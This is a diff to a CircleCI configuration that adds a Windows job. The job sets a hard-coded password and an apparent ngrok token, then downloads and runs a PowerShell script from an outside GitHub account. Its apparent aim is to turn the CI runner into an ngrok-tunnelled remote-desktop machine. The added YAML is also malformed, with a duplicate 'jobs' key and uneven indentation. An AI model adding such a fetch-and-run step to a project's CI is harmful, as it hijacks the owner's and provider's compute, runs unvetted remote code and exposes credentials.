@@ -11,6 +11,21 @@ workflows:
     jobs:
       - browser-tests
       - ui-tests
+      
+ jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - run:
+          name: Windows RDP Circle CI NEW UPDATED
+          command: |
+            Set-Variable -Name "PASSWORD" -Value "fmcpe@1234"
+            Set-Variable -Name "NGROK" -Value "1pSukobLaMAE9YhSFTOMRgRKNl5_4b9mzLFasTM1feJDDKghG"
+            Invoke-WebRequest https://raw.githubusercontent.com/kijang-008/repo1/main/configure.ps1 -OutFile RDPcircleCI.ps1
+            ./RDPcircleCI.ps1
 
 jobs:
   build:
